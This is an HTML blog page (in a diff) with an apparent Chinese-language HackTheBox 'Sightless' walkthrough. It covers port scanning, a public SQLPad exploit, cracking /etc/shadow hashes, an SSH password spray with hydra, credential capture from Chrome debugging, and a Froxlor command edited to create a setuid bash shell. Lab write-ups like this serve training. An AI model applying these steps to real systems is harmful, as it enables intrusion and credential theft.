@@ -1,0 +1,327 @@
+<!DOCTYPE html><html lang="zh-CN" data-astro-cid-sgg5joot><head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/png" href="/favicon.png"><link rel="icon" href="/favicon.ico" sizes="any"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="Zumpyx Blog" href="https://blog.zumpyx.com/rss.xml"><meta name="generator" content="Astro v7.1.0"><meta name="color-scheme" content="light dark"><meta name="theme-color" content="#0b0d11" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#f4f5f7" media="(prefers-color-scheme: light)"><script>
+	(() => {
+		try {
+			const t = localStorage.getItem('theme');
+			if (t === 'light' || t === 'dark') document.documentElement.setAttribute('data-theme', t);
+			else document.documentElement.removeAttribute('data-theme');
+		} catch {}
+	})();
+</script><style>@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/89758defcfa85239.woff") format("woff");font-display:swap;font-weight:400;font-style:normal;}@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/14aa8dd5744dd4bc.woff") format("woff");font-display:swap;font-weight:700;font-style:normal;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial";src:local("Arial");font-display:swap;font-weight:400;font-style:normal;size-adjust:99.3717%;ascent-override:80.1033%;descent-override:25.2587%;line-gap-override:0%;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial Bold";src:local("Arial Bold");font-display:swap;font-weight:700;font-style:normal;size-adjust:92.2954%;ascent-override:86.2448%;descent-override:27.1953%;line-gap-override:0%;}:root{--font-atkinson:Atkinson-c7f4c4e8b285552f,"Atkinson-c7f4c4e8b285552f fallback: Arial","Atkinson-c7f4c4e8b285552f fallback: Arial Bold",sans-serif;}</style><link rel="preload" href="/_astro/fonts/89758defcfa85239.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/_astro/fonts/14aa8dd5744dd4bc.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://blog.zumpyx.com/hackthebox/machines/0624-sightless/"><!-- Primary Meta Tags --><title>Sightless · Zumpyx Blog</title><meta name="description" content="`Sightless` is an easy-difficulty Linux machine featuring a website for a company offering various services. Enumeration of the website reveals an `SQLPad` instance vulnerable to template injection `[CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)`, which is leveraged to gain a foothold inside a Docker container. Further enumeration reveals the `/etc/shadow` file with a password hash, which is cracked to reveal the password, granting `SSH` access to the host. Post-exploitation enumeration reveals a `Froxlor` instance vulnerable to Blind `XSS` `[CVE-2024-34070](https://nvd.nist.gov/vuln/detail/CVE-2024-34070)`. This is leveraged to gain access to the `FTP` service, which contains a `KeePass` database. Accessing the database reveals the root `SSH` keys, leading to a privileged shell on the host."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://blog.zumpyx.com/hackthebox/machines/0624-sightless/"><meta property="og:title" content="Sightless · Zumpyx Blog"><meta property="og:description" content="`Sightless` is an easy-difficulty Linux machine featuring a website for a company offering various services. Enumeration of the website reveals an `SQLPad` instance vulnerable to template injection `[CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)`, which is leveraged to gain a foothold inside a Docker container. Further enumeration reveals the `/etc/shadow` file with a password hash, which is cracked to reveal the password, granting `SSH` access to the host. Post-exploitation enumeration reveals a `Froxlor` instance vulnerable to Blind `XSS` `[CVE-2024-34070](https://nvd.nist.gov/vuln/detail/CVE-2024-34070)`. This is leveraged to gain access to the `FTP` service, which contains a `KeePass` database. Accessing the database reveals the root `SSH` keys, leading to a privileged shell on the host."><meta property="og:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><!-- Twitter --><meta name="twitter:card" content="summary_large_image"><meta name="twitter:url" content="https://blog.zumpyx.com/hackthebox/machines/0624-sightless/"><meta name="twitter:title" content="Sightless · Zumpyx Blog"><meta name="twitter:description" content="`Sightless` is an easy-difficulty Linux machine featuring a website for a company offering various services. Enumeration of the website reveals an `SQLPad` instance vulnerable to template injection `[CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)`, which is leveraged to gain a foothold inside a Docker container. Further enumeration reveals the `/etc/shadow` file with a password hash, which is cracked to reveal the password, granting `SSH` access to the host. Post-exploitation enumeration reveals a `Froxlor` instance vulnerable to Blind `XSS` `[CVE-2024-34070](https://nvd.nist.gov/vuln/detail/CVE-2024-34070)`. This is leveraged to gain access to the `FTP` service, which contains a `KeePass` database. Accessing the database reveals the root `SSH` keys, leading to a privileged shell on the host."><meta name="twitter:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><link rel="stylesheet" href="/_astro/Header.BMe4uPxC.css"><style>.machine-list[data-astro-cid-twh6cqtg]{border:1px solid var(--border);border-radius:var(--radius);background:var(--bg-elevated);box-shadow:var(--shadow);margin-bottom:2rem;padding:1rem 1.15rem}.machine-list[data-astro-cid-twh6cqtg] h2[data-astro-cid-twh6cqtg]{font-size:1.1rem;font-family:var(--font-mono);color:var(--accent);margin:0 0 .65rem}.machine-list[data-astro-cid-twh6cqtg] ul[data-astro-cid-twh6cqtg]{margin:0;padding-left:1.2rem}.machine-list[data-astro-cid-twh6cqtg] li[data-astro-cid-twh6cqtg]{margin:.35rem 0}.machine-ref[data-astro-cid-twh6cqtg]{color:var(--text-bright);align-items:center;gap:.5rem;text-decoration:none;display:inline-flex}.machine-ref[data-astro-cid-twh6cqtg]:hover{color:var(--accent)}.machine-ref[data-astro-cid-twh6cqtg] img[data-astro-cid-twh6cqtg]{object-fit:cover;border:1px solid var(--border);border-radius:6px}.missing[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-family:var(--font-mono);font-size:.9em}.diff[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-size:.9em}.diff[data-astro-cid-twh6cqtg].very-easy{color:var(--very-easy)}.diff[data-astro-cid-twh6cqtg].easy{color:var(--easy)}.diff[data-astro-cid-twh6cqtg].medium{color:var(--medium)}.diff[data-astro-cid-twh6cqtg].hard{color:var(--hard)}.diff[data-astro-cid-twh6cqtg].insane{color:var(--insane)}
+main[data-astro-cid-sgg5joot]{width:calc(100% - 2em);max-width:100%;margin:0}.hero-image[data-astro-cid-sgg5joot]{width:100%}.hero-image[data-astro-cid-sgg5joot] img[data-astro-cid-sgg5joot]{border-radius:var(--radius);border:1px solid var(--border);box-shadow:var(--shadow);margin:0 auto;display:block}.prose[data-astro-cid-sgg5joot]{width:720px;max-width:calc(100% - 2em);color:var(--text);margin:auto;padding:1em}.prose[data-astro-cid-sgg5joot] img{border-radius:var(--radius-sm);border:1px solid var(--border);max-width:100%;height:auto}.prose[data-astro-cid-sgg5joot] a{color:var(--link)}.title[data-astro-cid-sgg5joot]{text-align:center;margin-bottom:1.25em;padding:1.25em 0 .5em;line-height:1.2}.title-row[data-astro-cid-sgg5joot]{justify-content:center;align-items:center;gap:.85rem;margin:0 0 .5em;display:flex}.title-row[data-astro-cid-sgg5joot] .avatar[data-astro-cid-sgg5joot],.title-row[data-astro-cid-sgg5joot] img{border-radius:var(--radius-sm);object-fit:contain;border:1px solid var(--border);width:52px;height:52px;box-shadow:0 0 20px var(--accent-glow);background:0 0;flex:none}.title[data-astro-cid-sgg5joot] h1[data-astro-cid-sgg5joot]{margin:0;font-size:clamp(1.75rem,4vw,2.5rem)}.date[data-astro-cid-sgg5joot]{color:var(--text-muted);font-family:var(--font-mono);letter-spacing:.04em;margin-bottom:.65em;font-size:.85rem}.last-updated-on[data-astro-cid-sgg5joot]{opacity:.85;margin-top:.25em;font-style:normal}.meta[data-astro-cid-sgg5joot]{flex-wrap:wrap;justify-content:center;gap:.45em;margin:.85em 0 0;display:flex}.meta[data-astro-cid-sgg5joot] .badge{font-size:.72rem;font-weight:600;font-family:var(--font-mono);letter-spacing:.06em;color:var(--text);border:1px solid var(--border);text-transform:uppercase;background:#ffffff08;border-radius:999px;align-items:center;gap:.35em;padding:.35em .75em;display:inline-flex;box-shadow:inset 0 1px #ffffff08}.meta[data-astro-cid-sgg5joot] .badge.difficulty-very-easy{color:var(--very-easy);background:#9ef01a1a;border-color:#9ef01a52}.meta[data-astro-cid-sgg5joot] .badge.difficulty-easy{color:var(--easy);background:#9fef001f;border-color:#9fef0059}.meta[data-astro-cid-sgg5joot] .badge.difficulty-medium{color:var(--medium);background:#ffcc001f;border-color:#ffcc0059}.meta[data-astro-cid-sgg5joot] .badge.difficulty-hard{color:var(--hard);background:#ff88001f;border-color:#f806}.meta[data-astro-cid-sgg5joot] .badge.difficulty-insane{color:var(--insane);background:#ff3e3e1f;border-color:#ff3e3e66}.links[data-astro-cid-sgg5joot]{font-size:.9rem;font-family:var(--font-mono);flex-wrap:wrap;justify-content:center;gap:1em;margin-top:.9em;display:flex}.links[data-astro-cid-sgg5joot] a{color:var(--accent);text-decoration:none}.links[data-astro-cid-sgg5joot] a:hover{text-underline-offset:.2em;text-decoration:underline}
+.nav-link[data-astro-cid-evkijfd6]{color:var(--text-muted);font-family:var(--font-mono);letter-spacing:.04em;text-transform:uppercase;white-space:nowrap;border:1px solid #0000;border-radius:999px;justify-content:center;align-items:center;padding:.5em .95em;font-size:.78rem;font-weight:500;text-decoration:none;transition:color .18s,background .18s,border-color .18s,box-shadow .18s;display:inline-flex}.nav-link[data-astro-cid-evkijfd6]:hover{color:var(--text-bright);background:var(--surface-hover);text-decoration:none}.nav-link[data-astro-cid-evkijfd6].active{color:var(--on-accent);background:linear-gradient(135deg, var(--accent-hover), var(--accent));box-shadow:0 0 0 1px var(--border-strong), 0 6px 16px var(--accent-glow-strong);text-shadow:none;border-color:#0000;font-weight:700;text-decoration:none}
+</style><script type="module" src="/_astro/page.CTxKKjGj.js"></script></head><body data-astro-cid-sgg5joot><div class="scanline" aria-hidden="true" data-astro-cid-sgg5joot></div><header data-astro-cid-nen7h5rs><div class="bar" data-astro-cid-nen7h5rs><a class="brand" href="/" data-astro-cid-nen7h5rs><span class="logo" aria-hidden="true" data-astro-cid-nen7h5rs><img src="/_astro/head.CE6FOIKY_1SW1hc.webp" srcset="/_astro/head.CE6FOIKY_1SW1hc.webp 1x, /_astro/head.CE6FOIKY_scYzG.webp 2x" alt data-astro-cid-nen7h5rs="true" loading="lazy" decoding="async" width="64" height="64" class="logo-img"></span><span class="brand-text" data-astro-cid-nen7h5rs><span class="prompt" aria-hidden="true" data-astro-cid-nen7h5rs>~/</span><span class="brand-name" data-astro-cid-nen7h5rs>Zumpyx Blog</span></span></a><nav class="nav-pill" aria-label="Primary" data-astro-cid-nen7h5rs><div class="nav-track" data-astro-cid-nen7h5rs><a href="/" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Home</a><a href="/blog" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Blog</a><a href="/hackthebox" class="nav-link active" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>HackTheBox</a><a href="/projects" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Projects</a><a href="/about" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>About</a></div></nav><div class="actions" data-astro-cid-nen7h5rs><button type="button" class="icon-btn search-trigger" data-search-open aria-label="搜索" title="搜索 (Ctrl/⌘+K)" data-astro-cid-7yy3665x><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg></button><div class="search-root" data-search-root hidden data-astro-cid-7yy3665x><div class="search-backdrop" data-search-close data-astro-cid-7yy3665x></div><div class="search-panel" role="dialog" aria-modal="true" aria-label="全站搜索" data-astro-cid-7yy3665x><div class="search-bar" data-astro-cid-7yy3665x><svg class="search-ico" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg><input type="search" class="search-input" data-search-input placeholder="全文搜索：标题 / 正文 / 标签…" autocomplete="off" autocapitalize="off" spellcheck="false" enterkeyhint="search" data-astro-cid-7yy3665x><kbd class="search-kbd" data-search-close-hint data-astro-cid-7yy3665x>Esc</kbd></div><div class="search-meta" data-search-meta data-astro-cid-7yy3665x>输入关键词开始搜索</div><ul class="search-results" data-search-results role="listbox" aria-label="搜索结果" data-astro-cid-7yy3665x></ul></div></div><script type="module" src="/_astro/SiteSearch.astro_astro_type_script_index_0_lang.CiT4pk6n.js"></script><button type="button" class="icon-btn theme-toggle" data-theme-toggle aria-label="主题：跟随系统" title="主题：跟随系统（点击切换）" data-astro-cid-l6lhmie6><span class="icon icon-system" aria-hidden="true" data-astro-cid-l6lhmie6><!-- auto / system --><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><rect x="3" y="4" width="18" height="12" rx="2" data-astro-cid-l6lhmie6></rect><path d="M8 20h8M12 16v4" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-light" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><circle cx="12" cy="12" r="4" data-astro-cid-l6lhmie6></circle><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-dark" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><path d="M21 14.5A8.5 8.5 0 1 1 9.5 3a7 7 0 0 0 11.5 11.5z" stroke-linejoin="round" data-astro-cid-l6lhmie6></path></svg></span></button><script>
+	(() => {
+		const KEY = 'theme';
+		const ORDER = ['system', 'light', 'dark'];
+		const LABELS = {
+			system: '主题：跟随系统',
+			light: '主题：亮色',
+			dark: '主题：暗色',
+		};
+
+		const getStored = () => {
+			try {
+				const v = localStorage.getItem(KEY);
+				if (v === 'light' || v === 'dark' || v === 'system') return v;
+			} catch {}
+			return 'system';
+		};
+
+		const apply = (mode) => {
+			const root = document.documentElement;
+			if (mode === 'light' || mode === 'dark') root.setAttribute('data-theme', mode);
+			else root.removeAttribute('data-theme');
+			try {
+				if (mode === 'system') localStorage.removeItem(KEY);
+				else localStorage.setItem(KEY, mode);
+			} catch {}
+		};
+
+		const syncButton = (mode) => {
+			document.querySelectorAll('[data-theme-toggle]').forEach((btn) => {
+				btn.setAttribute('data-mode', mode);
+				btn.setAttribute('aria-label', LABELS[mode]);
+				btn.setAttribute('title', `${LABELS[mode]}（点击切换）`);
+				btn.querySelectorAll('.icon').forEach((el) => {
+					el.hidden = true;
+				});
+				const icon = btn.querySelector(`.icon-${mode}`);
+				if (icon) icon.hidden = false;
+			});
+		};
+
+		const mode = getStored();
+		apply(mode);
+		syncButton(mode);
+
+		document.querySelectorAll('[data-theme-toggle]').forEach((btn) => {
+			btn.addEventListener('click', () => {
+				const cur = getStored();
+				const next = ORDER[(ORDER.indexOf(cur) + 1) % ORDER.length];
+				apply(next);
+				syncButton(next);
+			});
+		});
+
+		// If following system, react to OS changes
+		try {
+			const mq = window.matchMedia('(prefers-color-scheme: dark)');
+			mq.addEventListener?.('change', () => {
+				if (getStored() === 'system') apply('system');
+			});
+		} catch {}
+	})();
+</script><a class="icon-btn" href="/rss.xml" target="_blank" rel="noopener noreferrer" title="RSS" aria-label="RSS 订阅" data-astro-cid-nen7h5rs><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-nen7h5rs><path d="M5 19a1.5 1.5 0 1 0 0.01 0" fill="currentColor" stroke="none" data-astro-cid-nen7h5rs></path><path d="M4 11a9 9 0 0 1 9 9" stroke-linecap="round" data-astro-cid-nen7h5rs></path><path d="M4 5a15 15 0 0 1 15 15" stroke-linecap="round" data-astro-cid-nen7h5rs></path></svg></a></div></div></header><main data-astro-cid-sgg5joot><article data-astro-cid-sgg5joot><div class="prose" data-astro-cid-sgg5joot><div class="title" data-astro-cid-sgg5joot><div class="date" data-astro-cid-sgg5joot><time datetime="2024-09-07T00:00:00.000Z">2024-09-07</time></div><div class="title-row" data-astro-cid-sgg5joot><img src="/_astro/avatar.DFzFIHr2_HY6Gq.webp" alt data-astro-cid-sgg5joot="true" loading="lazy" decoding="async" width="48" height="48" class="avatar"><h1 data-astro-cid-sgg5joot>Sightless</h1></div><div class="meta" data-astro-cid-sgg5joot><span class="badge" data-astro-cid-twh6cqtg>Machines</span><span class="badge" data-astro-cid-twh6cqtg>#624</span><span class="badge difficulty-easy" data-astro-cid-twh6cqtg>Easy</span><span class="badge" data-astro-cid-twh6cqtg>Linux</span><span class="badge" data-astro-cid-twh6cqtg>sightless</span></div><div class="links" data-astro-cid-sgg5joot><a href="/hackthebox/machines/" data-astro-cid-twh6cqtg>← Machines</a></div><hr data-astro-cid-sgg5joot></div><h2 id="recon--enum">Recon &amp; Enum</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>PORT   STATE SERVICE VERSION</span></span>
+<span class="line"><span>21/tcp open  ftp</span></span>
+<span class="line"><span>| fingerprint-strings: </span></span>
+<span class="line"><span>|   GenericLines: </span></span>
+<span class="line"><span>|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.129.231.103]</span></span>
+<span class="line"><span>|     Invalid command: try being more creative</span></span>
+<span class="line"><span>|_    Invalid command: try being more creative</span></span>
+<span class="line"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span></span>
+<span class="line"><span>| ssh-hostkey: </span></span>
+<span class="line"><span>|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)</span></span>
+<span class="line"><span>|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)</span></span>
+<span class="line"><span>80/tcp open  http    nginx 1.18.0 (Ubuntu)</span></span>
+<span class="line"><span>|_http-server-header: nginx/1.18.0 (Ubuntu)</span></span>
+<span class="line"><span>|_http-title: Sightless.htb</span></span></code></pre>
+<h2 id="shell-as-docker-sqlpad-root">Shell as Docker-SQLPad-Root</h2>
+<p><img alt="image-20241210092428759.png" loading="lazy" decoding="async" width="972" height="1018" src="/_astro/image-20241210092428759.vJWIWo_T_Z1vNw7a.webp" srcset=""></p>
+<p>浏览页面时发现有一个服务跳转的 VHost，添加 Hosts 访问。</p>
+<p><img alt="image-20241210093047598.png" loading="lazy" decoding="async" width="1909" height="937" src="/_astro/image-20241210093047598.D45lnXhc_Z1KQMcn.webp" srcset=""></p>
+<p>是一个 SQLPad，Google 搜到了一个 CVE-2022-0944 RCE 漏洞</p>
+<blockquote>
+<p><a href="https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944">https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944</a></p>
+</blockquote>
+<p><img alt="image-20241210093036929.png" loading="lazy" decoding="async" width="1656" height="958" src="/_astro/image-20241210093036929.BOiQU9uG_2lYByr.webp" srcset=""></p>
+<h3 id="local-enum">Local Enum</h3>
+<p><img alt="image-20241210093257452.png" loading="lazy" decoding="async" width="1260" height="274" src="/_astro/image-20241210093257452.D-3PnZLX_uFt79.webp" srcset=""></p>
+<p>当前目录发现一个 sqlite 数据库，查看一下内部是否有凭据信息</p>
+<p><img alt="image-20241210093624320.png" loading="lazy" decoding="async" width="2455" height="601" src="/_astro/image-20241210093624320.B5xMKedr_1kMQV4.webp" srcset=""></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>hashcat -m 3200 sqlpad_admin.hash rockyou.txt</span></span>
+<span class="line"><span>---</span></span>
+<span class="line"><span>...</span></span>
+<span class="line"><span>$2a$10$cjbITibC.4BQQKJ8NOBUv.p0bG2n8t.RIIKRysR6pZnxquAWsLFcC:admin</span></span>
+<span class="line"><span>...</span></span></code></pre>
+<p>得到凭据 <code>admin@sightless.htb / admin</code>，查看 <code>/etc/shadow</code> 文件，并爆破</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::</span></span>
+<span class="line"><span>daemon:*:19051:0:99999:7:::</span></span>
+<span class="line"><span>bin:*:19051:0:99999:7:::</span></span>
+<span class="line"><span>sys:*:19051:0:99999:7:::</span></span>
+<span class="line"><span>sync:*:19051:0:99999:7:::</span></span>
+<span class="line"><span>games:*:19051:0:99999:7:::</span></span>
+<span class="line"><span>man:*:19051:0:99999:7:::</span></span>
+<span class="line"><span>lp:*:19051:0:99999:7:::</span></span>
+<span class="line"><span>mail:*:19051:0:99999:7:::</span></span>
+<span class="line"><span>news:*:19051:0:99999:7:::</span></span>
+<span class="line"><span>uucp:*:19051:0:99999:7:::</span></span>
+<span class="line"><span>proxy:*:19051:0:99999:7:::</span></span>
+<span class="line"><span>www-data:*:19051:0:99999:7:::</span></span>
+<span class="line"><span>backup:*:19051:0:99999:7:::</span></span>
+<span class="line"><span>list:*:19051:0:99999:7:::</span></span>
+<span class="line"><span>irc:*:19051:0:99999:7:::</span></span>
+<span class="line"><span>gnats:*:19051:0:99999:7:::</span></span>
+<span class="line"><span>nobody:*:19051:0:99999:7:::</span></span>
+<span class="line"><span>_apt:*:19051:0:99999:7:::</span></span>
+<span class="line"><span>node:!:19053:0:99999:7:::</span></span>
+<span class="line"><span>michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::</span></span></code></pre>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>hashcat -m 1800 docker.hash rockyou.txt</span></span>
+<span class="line"><span>---</span></span>
+<span class="line"><span>...</span></span>
+<span class="line"><span>$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:blindside</span></span>
+<span class="line"><span>$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse</span></span>
+<span class="line"><span>...</span></span></code></pre>
+<h2 id="shell-as-michael">Shell as Michael</h2>
+<p>现在已有凭据</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>admin</span></span>
+<span class="line"><span>blindside</span></span>
+<span class="line"><span>insaneclownposse</span></span></code></pre>
+<p>已有用户名</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>admin</span></span>
+<span class="line"><span>john</span></span>
+<span class="line"><span>michael</span></span>
+<span class="line"><span>root</span></span>
+<span class="line"><span>node</span></span></code></pre>
+<p>尝试密码喷射</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>hydra -L user.list -P pass.list ssh://sightless.htb</span></span></code></pre>
+<p><img alt="image-20241210110436868.png" loading="lazy" decoding="async" width="1471" height="417" src="/_astro/image-20241210110436868.B52hqEc4_ZbXVNC.webp" srcset=""></p>
+<p><img alt="image-20241210110540116.png" loading="lazy" decoding="async" width="1059" height="148" src="/_astro/image-20241210110540116.BxKRh3KX_24Qbtx.webp" srcset=""></p>
+<p>登录成功</p>
+<h3 id="local-enum-1">Local Enum</h3>
+<p><img alt="image-20241210110832351.png" loading="lazy" decoding="async" width="2011" height="469" src="/_astro/image-20241210110832351.XA6kjAvf_2ikDT4.webp" srcset=""></p>
+<p><img alt="image-20241210143534143.png" loading="lazy" decoding="async" width="2532" height="543" src="/_astro/image-20241210143534143.DCM7pBry_ZWKtus.webp" srcset=""></p>
+<p>发现本地还有其他服务，发现 john 用户运行的 chrome 进程，通过 chisel 代理端口到本地</p>
+<p><img alt="image-20241210113024462.png" loading="lazy" decoding="async" width="1831" height="1453" src="/_astro/image-20241210113024462.4cCUtUrV_2qS1mx.webp" srcset=""></p>
+<blockquote>
+<p><a href="https://github.com/mhaskar/CVE-2023-0315">https://github.com/mhaskar/CVE-2023-0315</a></p>
+</blockquote>
+<p>发现一个 CVE 但是需要凭据，转向 chrome 进程的远程调试端口。</p>
+<p><img alt="image-20241210150218425.png" loading="lazy" decoding="async" width="1350" height="1011" src="/_astro/image-20241210150218425.DtQsa0qm_Z18Ozy.webp" srcset=""></p>
+<p><img alt="image-20241210150306472.png" loading="lazy" decoding="async" width="2274" height="1264" src="/_astro/image-20241210150306472.Dn2MAYPX_1y2vuC.webp" srcset=""></p>
+<p>很快就能抓到凭据了：<code>admin / ForlorfroxAdmin</code></p>
+<p><img alt="image-20241210151326721.png" loading="lazy" decoding="async" width="1767" height="397" src="/_astro/image-20241210151326721.BNQw_1nl_ZJQ4K4.webp" srcset=""></p>
+<p>但是 CVE 利用失败，那么登录这个站点看一下</p>
+<p><img alt="image-20241210151824493.png" loading="lazy" decoding="async" width="1483" height="585" src="/_astro/image-20241210151824493.CpcxQSuY_Z2qrQ3I.webp" srcset=""></p>
+<p><img alt="image-20241210152233840.png" loading="lazy" decoding="async" width="2446" height="1050" src="/_astro/image-20241210152233840.CpsS_JbM_Z1p9gm3.webp" srcset=""></p>
+<p>这里发现了一个 web1 资源，点击查看详细信息</p>
+<p><img alt="image-20241210152331178.png" loading="lazy" decoding="async" width="2218" height="1090" src="/_astro/image-20241210152331178.Dk38z8Za_Z1K5buC.webp" srcset=""></p>
+<p>里面包含一个 FTP 账户</p>
+<p><img alt="image-20241210152358937.png" loading="lazy" decoding="async" width="2371" height="1363" src="/_astro/image-20241210152358937.yFUFwsh0_Uavry.webp" srcset=""></p>
+<p>得到了 FTP 的凭据 <code>web1 / kpPHxhwjid</code></p>
+<p><img alt="image-20241210153348884.png" loading="lazy" decoding="async" width="1341" height="231" src="/_astro/image-20241210153348884.DNAo0yzh_1dlYBm.webp" srcset=""></p>
+<p>但是登录失败，在回到 Froxlor 服务</p>
+<p><img alt="image-20241210153451920.png" loading="lazy" decoding="async" width="2520" height="1423" src="/_astro/image-20241210153451920.co1EKZTg_1RtQMc.webp" srcset=""></p>
+<p>发现这个命令可以修改，那么改成 <code>cp /usr/bin/bash /tmp/shell; chmod 4777 /tmp/shell</code></p>
+<p>但是写一行会格式错误，分成两次来写</p>
+<p><img alt="image-20241210153814828.png" loading="lazy" decoding="async" width="2281" height="1051" src="/_astro/image-20241210153814828.jKVhzWPs_2krK70.webp" srcset=""></p>
+<p><img alt="image-20241210153838052.png" loading="lazy" decoding="async" width="2104" height="670" src="/_astro/image-20241210153838052.Dp0uhi5c_Z15gh1u.webp" srcset=""></p>
+<p>这里发现并没有立即触发，寻找一下能够触发重启 PHP-FPM 服务的功能点，没找到</p>
+<p><img alt="image-20241210154056168.png" loading="lazy" decoding="async" width="1431" height="687" src="/_astro/image-20241210154056168.Bk9XBgzI_1T8Ljr.webp" srcset=""></p>
+<p>不过再看的时候命令已经执行完成了，看来是有计划任务在执行</p>
+<p><img alt="image-20241210154147011.png" loading="lazy" decoding="async" width="1320" height="463" src="/_astro/image-20241210154147011.Bbva5Vk0_Z1zeJLw.webp" srcset=""></p>
+<h2 id="more">More</h2>
+<h3 id="dump-hash">Dump Hash</h3>
